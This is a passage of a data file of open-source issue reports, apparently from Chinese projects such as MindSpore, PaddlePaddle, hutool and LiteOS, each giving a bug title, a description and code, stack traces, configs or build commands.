如果要给第三方提供ip他们加白名单，是要提供哪个IP,"目前支持的ip白名单比较简单，WebAllowAccessIps这个参数如果为空，表示不启用ip名单过滤，如果服务端仅接收ip为这个客户端访问，则配置服务器端。 另外支持自定义身份验证方式，可以根据业务需要通过加密验签的方式进行校验客户端访问的权限。 使用方式为是在依赖注入在 文件 方法中添加自定义实现   <code>: { ""Logging"": { ""LogLevel"": { // Trace Debug Information Warning Error ""Default"": ""Trace"", ""Microsoft"": ""Warning"", ""Microsoft.Hosting.Lifetime"": ""Information"" } }, ""AllowedHosts"": ""*"", ""ServerSettings"": { // 必选 默认值 ""BindAddr"": ""0.0.0.0"", // 必选 默认值 ""BindPort"": 1271, // 自定义域名web穿透必须 ""WebDomain"": ""test.cc"", // 服务监听的端口号, 访问自定义域名站点时url为 http://{SubDomain}.{Domain}:{ProxyPort_HTTP}/ // web穿透必须 ""WebProxyPort"": 1270, // 可选，ngixn反向代理后可省略域名后的端口号进行访问 ""WebHasNginxProxy"": false, // 可选，访问白名单，不在白名单的ip拒绝 ""WebAllowAccessIps"": [], // 可选，是否开启SSH，禁用后不处理SSH类型端口转发.默认false。 ""SSHEnabled"": true } } 10.10.101.101 WebAllowAccessIps:[10.10.101.101] Startup.cs ConfigureServices services.AddTransient&lt;IFastTunnelAuthenticationFilter, MyAuthenticationFilter&gt;();"
[CT][MS][OP]Eye operator acceptance Issues.,"不支持bool类型&amp;core dump / 硬件环境: ascend gpu cpu /device ascend /device gpu /device cpu : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph test_eye_forward_input_bool test_eye_forward_input_msdtype_not_ms pytest -v -s test_eye.py::test_eye_forward_input_bool pytest -v -s test_eye.py::test_eye_forward_input_msdtype_not_ms pass 1.输入dtype为bool 2.Ascend、GPU环境出现core dump   <code>: def test_eye_forward_input_bool(): m = 2 n = 3 dtype = np.bool fact = EyeFactory(m, n, dtype) &gt; fact.forward_cmp() E TypeError: build/mindspore/merge/mindspore/core/ops_merge.cc:10946 EyeInferValue] Eye unsupported current data type . E The function call stack (See file '/home/zhangting/0331code/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /home/zhangting/0331code/MindSporeTest/share/ops/primitive/eye_ops.py(23) E return self.eye(self.m, self.n, self.dtype) Current thread 0x0000ffff95807440 (most recent call first): File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 1013 in compile File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 939 in compile File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 966 in compile_and_run File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 586 in __call__ File ""/home/zhangting/0331code/MindSporeTest/share/utils.py"", line 182 in __call__ File ""/home/zhangting/0331code/MindSporeTest/share/meta.py"", line 421 in __call__ File ""/home/zhangting/0331code/MindSporeTest/operations/test_eye.py"", line 247 in test_eye_forward_input_msdtype_not_ms File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhangting3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/archiconda3/envs/zhangting3.7/bin/pytest"", line 10 in &lt;module&gt; Segmentation fault (core dumped)"
集成了netty，新建的一个新netty模块，无法连接websocket,2.3.0版本 搭建netty，我的demo测试时成功的 但是集成了cloud之后，走网关8080，就报ws路径找不到 不走网关，直接走netty服务:端口，浏览器报   <code>: chat.html?_ijt=57emt9vq0i67sjc750r3b3p7jp:36 WebSocket connection to 'ws://192.168.1.13:9666/ws' failed: Error in connection establishment: net::ERR_CONNECTION_REFUSED
采用RFC3986会导致与JDK的URLEncoder编码不一致,"JDK版本： openjdk_8_201 hutool版本： 5.8.0.M3 升级高版本之后，弃用URLEncoder类，采用RFC3986会导致与JDK的URLEncoder编码不一致   <code>: String toVerifyText = ""行吧行吧 cargo:1.0,\""Deta-ils:[{""; System.out.println(URLUtil.encodeAll(toVerifyText, CharsetUtil.CHARSET_UTF_8)); System.out.println(URLEncodeUtil.encodeAll(toVerifyText, CharsetUtil.CHARSET_UTF_8)); System.out.println(URLEncoder.encode(toVerifyText, ""UTF-8""));"
在md文件里写delete语句删除数据，报错 ORA-01002: 提取违反顺序,"md文件： deleteByUserId mapper文件方法为： int deleteByUserId(@Param(""userId"") String userId);   <code>: delete user_module where user_id = #{userId}"
分页NPE,当前使用版本 3.4 打印sql拿出来 count=0的情况下报错 使用依旧是 PaginationInterceptor 没有用MybatisPlusInterceptor 切换回 3.3.2版本正常   <code>: org.apache.ibatis.type.TypeException: Error setting non null for parameter #1 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: org.apache.ibatis.type.TypeException: Error setting non null for parameter #1 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: java.lang.NullPointerException
[Faster_rcnn]The start row index must be lesser than the end row index,"Faster rcnn在训练时的评估中出错 1）PaddlePaddle版本：paddle1.6.2 cuda9_cudnn7 3）GPU：nvida P40/24G 4）系统环境：Unbuntu 16.04 训练信息 1）六机,每机一卡，fleet.dgc分布式训练方式 2）batch_size=8 3）pre_nms_top_n=1000 错误详情：使用单卡/两卡训练FasterRcnn，都正常，但使用6卡时会稳定出错。错误信息如下：   <code>: EnforceNotMet: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;std::string const&amp;&gt;(std::string const&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 2 paddle::framework::Tensor::Slice(long, long) const 3 paddle::operators::MultiClassNMSKernel&lt;float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const 4 std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor&lt;paddle::platform::CPUPlace, false, 0ul, paddle::operators::MultiClassNMSKernel&lt;float&gt;, paddle::operators::MultiClassNMSKernel&lt;double&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) 5 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 6 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 7 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 8 paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) 9 paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;, bool) ------------------------------------------ Python Call Stacks (More useful to users): ------------------------------------------ File ""/root/miniconda3/envs/python2/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 2488, in append_op attrs=kwargs.get(""attrs"", None)) File ""/root/miniconda3/envs/python2/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/root/miniconda3/envs/python2/lib/python2.7/site-packages/paddle/fluid/layers/detection.py"", line 3144, in multiclass_nms outputs={'Out': output}) File ""/tmp/code/user_custom.py"", line 1031, in get_prediction pred_result = self.nms(bboxes=cliped_box, scores=cls_prob) File ""/tmp/code/user_custom.py"", line 195, in create_model pred = bbox_head.get_prediction(roi_feat, rois, im_info, im_shape) File ""command.py"", line 111, in main wfw_obj = wfw_cls(workflow_conf) File ""command.py"", line 125, in &lt;module&gt; main() ---------------------- Error Message Summary: ---------------------- Error: The start row index must be lesser than the end row index. [Hint: Expected begin_idx &lt; end_idx, but received begin_idx:1000 &gt;= end_idx:1000.] at (/paddle/paddle/fluid/framework/tensor.cc:82) [operator &lt; multiclass_nms &gt; error]"
qemu多核启动数据同步问题,"【任务描述】 liteos_a qemu多核启动，MMU之前的写数据操作不生效。 定义true_start数组 reset_vector根据CPU ID开始处写true_start数组 OsMain中开始处打印true_start变量，发现数值仍为0x12121212 【解决方案】 【任务来源】   <code>: diff --git a/arch/arm/arm/src/startup/reset_vector_mp.S diff --git a/arch/arm/arm/src/startup/reset_vector_mp.S b/arch/arm/arm/src/startup/reset_vector_mp.S index d64a794..bb90adb 100644 --- a/arch/arm/arm/src/startup/reset_vector_mp.S +++ b/arch/arm/arm/src/startup/reset_vector_mp.S @@ -144,6 +144,21 @@ reset_vector: ldr r0, [r11] sub r11, r11, r0 + ldr r12, =__exception_handlers + ldr r0, =true_start + mrc p15, 0, r2, c0, c0, 5 /* r12: get cpuid */ + and r2, r2, #MPIDR_CPUID_MASK + add r0, r0, r2, LSL #2 + str r12, [r0] + str r12, [r0] + str r12, [r0] + str r12, [r0] + str r12, [r0] + str r12, [r0] + str r12, [r0] + str r12, [r0] + + mrc p15, 0, r12, c0, c0, 5 /* r12: get cpuid */ and r12, r12, #MPIDR_CPUID_MASK cmp r12, #0 @@ -464,13 +479,15 @@ init_done: .code 32 .data -#ifdef LOSCFG_PLATFORM_QEMU_ARM_VIRT_CA7 .global init_flag -#endif init_flag: .balign 4 - .space LOSCFG_KERNEL_SMP_CORE_NUM * 4, 0x0 - + .space LOSCFG_KERNEL_SMP_CORE_NUM * 4, 0x0 + .global true_start +true_start: + .balign 4 + .space LOSCFG_KERNEL_SMP_CORE_NUM * 4, 0x12 + /* * Temporary interrupt stack */ diff --git a/kernel/common/los_config.c b/kernel/common/los_config.c index 203ebcb..8328293 100644 --- a/kernel/common/los_config.c +++ b/kernel/common/los_config.c @@ -202,7 +202,11 @@ LITE_OS_SEC_TEXT_INIT INT32 OsMain(VOID) return ret; } OsInitCall(LOS_INIT_LEVEL_ARCH_EARLY); - + extern UINT32 true_start[]; + extern UINT32 init_flag[]; + PRINT_RELEASE(""[%s] %p var-addr = %p start = %p end = %p %p\n"", + __func__, true_start, true_start[0], &amp;__ram_data_start, + &amp;__ram_data_end, init_flag[0]); ret = PlatformEarlyInit(); if (ret != LOS_OK) { return ret;"
刚获取master分支代码，编译正常，启动注册中心正常，config启动错误，网关也错误,pig版本:最新master 操作系统:win10 是否修改包名: 没有 com.sun.jersey.api.client.ClientHandlerException: java.net.UnknownHostException: pig-eureka at com.sun.jersey.client.apache4.ApacheHttpClient4Handler.handle(ApacheHttpClient4Handler.java:187) at com.sun.jersey.api.client.filter.GZIPContentEncodingFilter.handle(GZIPContentEncodingFilter.java:123) at com.netflix.discovery.EurekaIdentityHeaderFilter.handle(EurekaIdentityHeaderFilter.java:27) at com.sun.jersey.api.client.Client.handle(Client.java:652) at com.sun.jersey.api.client.WebResource.handle(WebResource.java:682) at com.sun.jersey.api.client.WebResource.access$200(WebResource.java:74) at com.sun.jersey.api.client.WebResource$Builder.get(WebResource.java:509)   <code>: ###问题描述（包括回显步骤、截图 ） 视频演示中的版本应该不是最新的，我感觉就是基础配置问题没配好，像jdbc:mysql://pig-mysql:3306/pig这个配置中pig-mysql代表什么，是本地？ 还有：下面的hostname：pig-eureka pig-eureka是否也是本地？ eureka: instance: hostname: pig-eureka prefer-ip-address: true client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://pig:pig@${eureka.instance.hostname}:${server.port}/eureka/
paddle 是否支持 gpu + 同步训练 + 分布式的 embedding？,可以分布式存储，但是支持 cpu：<em>is_distributed (bool) - 是否使用分布式的方式存储embedding矩阵，仅在多机分布式cpu训练中使用。</em>，而且这个 api 已经 deprecated。 https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/fluid/layers/embedding_cn.html 而 paddle 2 的 api 文档没 这个参数。请问是砍掉了这个 feature 么？ https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/Embedding_cn.html 如果我需要分布式的 embedding + 同步训练 + gpu 应该怎么做呢？   <code>: paddle.fluid.layers.embedding paddle.nn.embedding is_distributed
vue2前端使用build:test打包后浏览器访问首页转圈并报错Unexpected token '<' app.js,"版本号： 3.4.0 前端版本： vue2版 前端代码 使用命令打包后，将dist放到服务器目录的nginx服务下，浏览器访问时始终在""系统正在加载中""页面转圈且浏览器控制台报错：SyntaxError: Unexpected token '&lt;' app.js   <code>: yarn run build --mode test"
JSONUtil带斜杠的字符串转JSON报错,"JDK版本： openjdk_8_241 hutool版本： 5.8.3   <code>: System.out.println(JSONUtil.parse(""{a:2/3,b:1}"")); Exception in thread ""main"" cn.hutool.json.JSONException: Expected a ',' or '}' at 5 [character 6 line 1] at cn.hutool.json.JSONTokener.syntaxError(JSONTokener.java:396) at cn.hutool.json.JSONParser.parseTo(JSONParser.java:87) at cn.hutool.json.ObjectMapper.mapFromTokener(ObjectMapper.java:239) at cn.hutool.json.ObjectMapper.mapFromStr(ObjectMapper.java:215) at cn.hutool.json.ObjectMapper.map(ObjectMapper.java:98) at cn.hutool.json.JSONObject.&lt;init&gt;(JSONObject.java:211)"
[ST][MS][modelzoo][textcnn][win/ascend/gpu] textcnn训练失败,"textcnn在win-gpu环境训练失败,报错UnicoDedecodeError / 硬件环境: /device win_gpu : -- MindSpore version :master commit_id:a6ece5e3 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_textcnn_moviereview_win_gpu_train_infer_0001.py pytest -s test_ms_textcnn_moviereview_win_gpu_train_infer_0001.py 训练推理ok 转给安正气   <code>: Traceback (most recent call last): File ""train.py"", line 102, in &lt;module&gt; train_net() File ""D:\jenkins0\Solution_Test\cases\02network\00cv\resnet50\test_ms_textcnn_moviereview_win_gpu_train_infer_0001\model_utils\moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 49, in train_net instance = MovieReview(root_dir=config.data_path, maxlen=config.word_len, split=0.9) File ""D:\jenkins0\Solution_Test\cases\02network\00cv\resnet50\test_ms_textcnn_moviereview_win_gpu_train_infer_0001\src\dataset.py"", line 137, in __init__ ff = f.read() UnicodeDecodeError: 'gbk' codec can't decode byte 0xa2 in position 4664: illegal multibyte sequence 在win-gpu下报错： Traceback (most recent call last): File ""train.py"", line 102, in &lt;module&gt; train_net() File ""D:\jenkins0\Solution_Test\cases\02network\00cv\resnet50\test_ms_textcnn_moviereview_win_gpu_train_infer_0001\model_utils\moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 49, in train_net instance = MovieReview(root_dir=config.data_path, maxlen=config.word_len, split=0.9) File ""D:\jenkins0\Solution_Test\cases\02network\00cv\resnet50\test_ms_textcnn_moviereview_win_gpu_train_infer_0001\src\dataset.py"", line 137, in __init__ ff = f.read() UnicodeDecodeError: 'gbk' codec can't decode byte 0xa2 in position 4664: illegal multibyte sequence 在其他平台报错： Traceback (most recent call last): File ""train.py"", line 102, in &lt;module&gt; train_net() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/textcnn/pynative/test_ms_usability_benchmark_pynative_ascend_textcnn_time_perf_loss_1p_0001/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 49, in train_net instance = MovieReview(root_dir=config.data_path, maxlen=config.word_len, split=0.9) File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/textcnn/pynative/test_ms_usability_benchmark_pynative_ascend_textcnn_time_perf_loss_1p_0001/src/dataset.py"", line 140, in __init__ self.read_data(filename) File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/textcnn/pynative/test_ms_usability_benchmark_pynative_ascend_textcnn_time_perf_loss_1p_0001/src/dataset.py"", line 152, in read_data with open(filePath, 'r', 'utf-8') as f: TypeError: an integer is required (got type str)"
ME graph compiler results error IR,": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: device cpu : -- MindSpore version : MindSpore master. commit id: 723109041a76ac02a12f5e4f3e1c9c11636fcb12 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu 16.04 -- GCC/Compiler version : 7.3.0 https://gitee.com/wilfchen/reinforcement.git commit id: 9d0fca00c7f886831fd8c308cb7e8e0282d96141 cd reinforcement/example/dqn set context device_target to 'CPU' python dqn_example.py The graph compiler result error IR: The flag in is So I think maybe the caches in ME need be clear before compile .   <code>: done train_one_epo True done train_one_epo False msrl fill_buffer evaluation train_one_epo fill_buffer evaluation train_one_epo train_one_epo"
paddle计算cost和auc的原理,"请教，paddle如何计算cost和auc？我的训练输出如下：cost在跳跃，auc却绝大部份时候都在稳定上升。是和auc的计算方式有关系吗？这个值可信吗？还有就是每次做完测试，下面的训练步骤中，auc会稍稍降低一点 Pass 1, batch 1909, cost 0.19247454, auc 0.6434270107163857 Pass 1, batch 1919, cost 0.22812182, auc 0.6434267787963717 Pass 1, batch 1929, cost 0.24577512, auc 0.6434510845627743 Pass 1, batch 1939, cost 0.20186093, auc 0.643460327533481 Pass 1, batch 1949, cost 0.22698459, auc 0.6435032802800212 Pass 1, batch 1959, cost 0.19867998, auc 0.6435776448961714 Pass 1, batch 1969, cost 0.16872633, auc 0.6435772155782321 Pass 1, batch 1979, cost 0.22229147, auc 0.6436030926709777 Pass 1, batch 1989, cost 0.22751878, auc 0.6436795211141892 Pass 1, batch 1999, cost 0.16602051, auc 0.643698203486087 Test with Pass 1, batch 1999, cost 0.16868488, auc 0.6425449517748172 Pass 1, batch 2009, cost 0.17661315, auc 0.641565554032737 Pass 1, batch 2019, cost 0.19275923, auc 0.6415964804081982 Pass 1, batch 2029, cost 0.18021822, auc 0.641636031573152 Pass 1, batch 2039, cost 0.18022606, auc 0.641631451746716 我的计算代码如下：   <code>: predict = layers.fc(input=combined, size=2, act=""softmax"") label = layers.data(name='label', shape=[1], dtype='int64') auc_var, cur_auc_var = fluid.layers.auc( input=predict, label=label, num_thresholds=2 ** 12) cost = layers.cross_entropy(input=predict, label=label) avg_cost = layers.mean(cost) return predict, avg_cost, auc_var"
按钮为layui-btn-disabled时，1像素的边框导致按钮宽出2像素,"上边的按钮如果为layui-btn-disabled，则样式上会有个灰色的1像素边框，从而导致这个按钮因为边框的缘故，比其他类型的按钮宽了2像素，如果一行有多个layui-btn-disabled的按钮，则会导致按钮位置与上、下行其他按钮无法对其。 例如下边截图所示 例如： 希望可以有相对彻底和完美的解决方案出来。   <code>: &lt;a class=""layui-btn layui-btn-disabled layui-btn-xs"" style=""padding:0 4px;"" lay-event=""edit""&gt;编辑&lt;/a&gt; &lt;a class=""layui-btn layui-btn-disabled layui-btn-xs"" style=""padding:0 4px;"" lay-event=""edit""&gt;编辑&lt;/a&gt;"
请问form.on事件监听的filter是否支持模糊匹配,"是否支持或可以支持？比如：   <code>: form.on('select(test*)', function (data) { console.log(data); });"
StrJoiner类的append方法添加数组时忽略setNullMode方法的设置,"JDK版本： java version ""1.8.0_171"" hutool版本： 5.7.11 具体引发的问题的方法在   <code>: private static String setRemark(Object... args) { return new StrJoiner("";"") .setNullMode(StrJoiner.NullMode.IGNORE) .append(args) .toString(); } public static void main(String[] args) { Console.log(setRemark(""123123123"", null, 15)); } /** * 追加{@link Iterator}中的元素到拼接器中 * * @param &lt;T&gt; 元素类型 * @param iterator 元素列表 * @return this */ public &lt;T&gt; StrJoiner append(Iterator&lt;T&gt; iterator) { if(null == iterator){ return this; } return append(iterator, (t) -&gt; StrJoiner.of(this.delimiter).append(t).toString()); }"
Add cross-compiling support for arm architecture.,"目前只能编译的版本。 准备Android的交叉编译环境： 下载Android ndk 生成独立的编译工具链，比如，生成最小API level为21、arm架构、gcc工具链，可使用命令 交叉编译Android版Paddle，主要涉及到以下修改： cmake编译配置，支持两种配置方式 编译方式1： 使用cmake本身对Android交叉编译的支持，要求cmake-3.7以上版本。cmake系统根据是否设置了来判断是否在进行交叉编译，会根据配置自动添加相应的编译选项，并且设置变量为TRUE。而Paddle的cmake文件在检测到交叉编译Android版本时，也会自动地设置 编译方式2： 手动配置编译选项。这种方式，cmake系统本身并不认为是在进行交叉编译，而是用户手动通过编译器、编译器选项在控制。 指令集相关代码实现 添加两个sse实现对应的neon实现版本 paddle/cuda/include/hl_matrix_base_sse.cuh -&gt; paddle/cuda/include/hl_matrix_base_neon.cuh paddle/cuda/include/hl_sse_matrix_kernel.cuh -&gt; paddle/cuda/include/hl_neon_matrix_kernel.cuh 通过添加控制，没有定义该宏则直接使用naive版本paddle/math/SIMDFunctions.h 系统功能支持的缺乏 通过cpuid动态查询指令集的支持，目前默认设置成支持指令，后期可以按照OpenBLAS的方式实现，Android版可以查询cpufeatures库 缺乏pthread组件：和 cmake中检查和这两个变量是否存在： 存在，分别定义宏和，直接采用pthread版本 不存在，采用和mac系统上一样的替代实现（paddle/utils/arch/linux/Locks.cpp）。（若确认采用这种方式，后期可将和合并成一个） 缺乏，实现了一个简单的内部版本（paddle/utils/StringUtil.h） 第三方库依赖 protobuf，需要编译host上的可执行程序和target上的库 OpenBLAS，需要编译arm_soft_fp_abi分支 由于Android发布的编译工具链不包含fortran编译器，因此只能编译版本，Paddle中添加宏控制lapack函数的调用 OpenBLAS编译命令：   <code>: WITH_PYTHON=OFF $ your-ndk-root/build/tools/make-standalone-toolchain.sh --arch=arm --platform=android-21 --install-dir=arm-android-21-gcc CMAKE_SYSTEM_NAME CMAKE_CROSSCOMPILING WITH_AVX=OFF; WITH_GPU=OFF; WITH_RDMA=OFF; WITH_PYTHON=OFF PROTOBUF=path/to/mixed-version-of-protobuf OPENBLAS_ROOT=path/to/openblas-arm_soft_fp_abi cmake -DCMAKE_SYSTEM_NAME=Android \ -DCMAKE_ANDROID_STANDALONE_TOOLCHAIN=your-standalone-toolchains/arm-android-21-gcc \ -DCMAKE_ANDROID_ARCH_ABI=armeabi-v7a \ -DCMAKE_ANDROID_ARM_MODE=ON \ -DCMAKE_ANDROID_ARM_NEON=ON \ -DOPENBLAS_ROOT=${OPENBLAS_ROOT} \ -DWITH_SWIG_PY=OFF \ -DCMAKE_PREFIX_PATH=""$PROTOBUF"" \ .. export PATH=your-standalone-toolchains/arm-android-21-gcc/bin:$PATH PROTOBUF=path/to/mixed-version-of-protobuf OPENBLAS_ROOT=path/to/openblas-arm_soft_fp_abi cmake -DCMAKE_C_COMPILER=arm-linux-androideabi-gcc \ -DCMAKE_CXX_COMPILER=arm-linux-androideabi-g++ \ -DCMAKE_C_FLAGS=""-marm -march=armv7-a -mfloat-abi=softfp -mfpu=neon -fPIE -pie"" \ -DCMAKE_CXX_FLAGS=""-marm -march=armv7-a -mfloat-abi=softfp -mfpu=neon -fPIE -pie"" \ -DCMAKE_EXE_LINKER_FLAGS=""-llog"" \ -DOPENBLAS_ROOT=${OPENBLAS_ROOT} \ -DWITH_GPU=OFF \ -DWITH_PYTHON=OFF \ -DWITH_SWIG_PY=OFF \ -DCMAKE_PREFIX_PATH=""$PROTOBUF"" \ .. __SSE__ NEON pthread_spinlock_t pthread_barrier_t pthread_spinlock_t pthread_barrier_t PADDLE_USE_PTHREAD_SPINLOCK PADDLE_USE_PTHREAD_BARRIER paddle/utils/arch/linux/Locks.cpp paddle/utils/arch/osx/Locks.cpp std::to_string protoc libprotobuf.a NO_LAPACK PADDLE_USE_LAPACK make TARGET=ARMV7 HOSTCC=gcc CC=arm-linux-androideabi-gcc ARM_SOFTFP_ABI=1 NOFORTRAN=1 USE_THREAD=0"
[CT][MS][switch_layer]Network with switch_layer could not be exported,": GPU /device gpu : VM+graph -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : [INFO] PIPELINE(30709,python):2020-08-25-09:12:45.452.549 [mindspore/ccsrc/pipeline/jit/pipeline.cc:484] CompileInner] End ExecutorPy compile! [ERROR] ONNX(30709,python):2020-08-25-09:12:45.453.122 [mindspore/ccsrc/transform/onnx/ir_exporter.cc:527] SetValueToAttributeProto] Unsupported type: FuncGraph [INFO] DEBUG(30709,python):2020-08-25-09:12:45.453.159 [mindspore/ccsrc/debug/trace.cc:427] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(30709,python):2020-08-25-09:12:45.453.184 [mindspore/ccsrc/debug/trace.cc:430] GetEvalStackInfo] Length of analysis information stack is empty. F ================================================================================================================= FAILURES ================================================================================================================= ______________________________________________________________________________________________________ test_parser_switch_with_export ______________________________________________________________________________________________________ test_parser_switch_layer.py:2331: /root/miniconda3/envs/wh/lib/python3.7/site-packages/mindspore/train/serialization.py:501: in export onnx_stream = _executor._get_func_graph_proto(graph_id, 'mind_ir') self = &lt;mindspore.common.api._Executor object at 0x7f4d4a5d6a90&gt;, exec_id = '0export.mindir.1598317949123016960', ir_type = 'mind_ir', use_prefix = False E RuntimeError: mindspore/ccsrc/transform/onnx/ir_exporter.cc:527 SetValueToAttributeProto] Unsupported type: FuncGraph /root/miniconda3/envs/wh/lib/python3.7/site-packages/mindspore/common/api.py:515: RuntimeError export bin file normally   <code>: def test_parser_switch_with_export(): func1 = TwoLayerReLU() func2 = TwoLayerSoftmax() net = LayerInputFinalNet(func1, func2) input = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(0, mstype.int32) export(net, i, input, file_name=""./net_export.bin"", file_format='MINDIR') @Author(""w00241623"") @Level1 @SKIP_ENV_DAVINCI_EXECUTOR() @SKIP_ENV_DAVINCI_GE() @SKIP_ENV_CPU() @SKIP_MODE_PYNATIVE() @AR(""https://gitee.com/mindspore/dashboard?issue_id=I1M8QC"") # @Skip_NotSupportCurrently(reason=""export could not save multiple graphs"") def test_parser_switch_with_export(): func1 = TwoLayerReLU() func2 = TwoLayerSoftmax() net = LayerInputFinalNet(func1, func2) input = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(0, mstype.int32) export(net, i, input, file_name=""./net_export.bin"", file_format='MINDIR') def 